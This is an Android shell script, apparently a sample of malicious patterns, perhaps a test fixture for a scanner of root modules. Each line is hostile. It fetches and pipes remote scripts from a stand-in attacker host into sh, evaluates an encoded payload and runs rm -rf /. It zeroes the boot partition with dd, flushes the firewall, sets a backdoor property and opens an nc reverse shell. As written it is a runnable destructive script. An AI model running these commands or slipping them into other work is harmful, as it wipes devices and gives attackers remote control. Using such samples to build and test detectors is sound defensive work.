#!/system/bin/sh
curl http://evil.example.com/payload.sh -o /data/local/tmp/p.sh
wget http://evil.example.com/second.sh
curl -s http://evil.example.com/third.sh | sh
base64 -d /data/local/tmp/p.b64 | sh
eval "$PAYLOAD"
rm -rf /data/adb/modules/other_module
rm -rf /
chmod 777 /system/bin/foo
mount -o rw,remount /system
setprop persist.sys.backdoor 1
resetprop ro.debuggable 1
su -c 'id'
iptables -F
dd if=/dev/zero of=/dev/block/by-name/boot bs=1M count=1
nc 192.168.1.100 4444 -e /system/bin/sh
echo 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODlBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OUFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk=' >> /data/local/tmp/p.b64
